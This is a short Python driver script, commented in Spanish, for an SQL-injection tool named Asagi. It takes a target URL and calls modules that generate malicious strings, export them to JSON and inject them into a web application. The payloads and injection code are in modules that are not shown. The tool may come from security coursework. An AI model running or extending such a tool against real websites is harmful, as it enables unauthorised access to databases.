# Explicacion
'''
    Asagi CWE 20 CAPEC 07 es un programa que tiene por objetivo
    Automatizar la creacion de una larga lista de cadenas maliciosas
    Crear un archivo JSON que las almacene
    Recibir ese archivo
    y utilizar esas cadenas
    para inyectarlas en una plataforma web vulnerable a SQLi Union
'''

# Uso operativo: $ python3 Asagi_CWE_CAPEC_07.py <url-objetivo>

import sys
from colorama import init, Fore, Style

import _01_Generator.Asagi_CWE_20_CAPEC_07_Generator
import _02_Exporter.Asagi_CWE_20_CAPEC_07_Exporter
import _03_Injector.Asagi_CWE_20_CAPEC_07_Injector

def main():
    
    '''Arranque de Colorama'''
    init()

    '''Mensaje de Bienvenida, Inicio del Programas'''
    print('\n[s] Asagi CWE 20 CAPEC 07 SQLi Blind Injector')
    print('[i] Sistema objetivo declarado: ' + Fore.GREEN + sys.argv[1] + Style.RESET_ALL + '\n')

    diccionario_maligno = _01_Generator.Asagi_CWE_20_CAPEC_07_Generator.Uno(sys.argv[1])
    print("[--] Asagi Main")

    print("\t[i] Enviando diccionario maligno a Asagi Exporter\n")
    _02_Exporter.Asagi_CWE_20_CAPEC_07_Exporter.Uno(diccionario_maligno)

    print("[--] Asagi Main")
    print("\t[i] Archivo JSON creado con exito. Iniciando inyeccion sobre sistema objetivo. \n")
    _03_Injector.Asagi_CWE_20_CAPEC_07_Injector.Inyeccion(sys.argv[1])



    


if __name__ == "__main__":
    main()